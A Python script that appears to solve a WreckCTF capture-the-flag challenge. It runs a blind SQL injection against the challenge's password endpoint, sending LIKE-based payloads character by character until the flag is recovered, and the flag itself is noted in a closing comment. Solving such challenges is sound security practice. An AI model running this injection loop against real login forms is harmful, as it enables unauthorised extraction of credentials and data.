import requests as r
import string 
from time import sleep

site = "https://password-3.challs.wreckctf.com/password"
 

# retrieve the flag backwards  %VALUE
# retrieve the flag upwards  VALUE_%
# I chose to retrieve the flag backwards due to "_" character
 
def blind_sql():
    alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' + "{|}_!#$()*+,-./:;<=>?@[]^"
    current_test = ""
    counter_char = 0
    valid_char="}"
    while (counter_char < len(alphabet) or ("flag" not in valid_char)):
        for i in alphabet:
            counter_char+=1
            current_test =   i + valid_char
            payload = "' or password like '%{}' --".format(current_test)
            
            full_payload = {"password":payload}
            print("[+] testing : " , full_payload)
        
            my_req = r.post(site, json=full_payload)
            
            response = my_req.text
            if "Congrats" in response : 
                counter_char=0
                temp_char= valid_char
                valid_char = i+ temp_char
                
                print("[+]found: ", valid_char)
                break
            

            sleep(0.4)

blind_sql()


# flag : flag{whee_binary_search_sqli}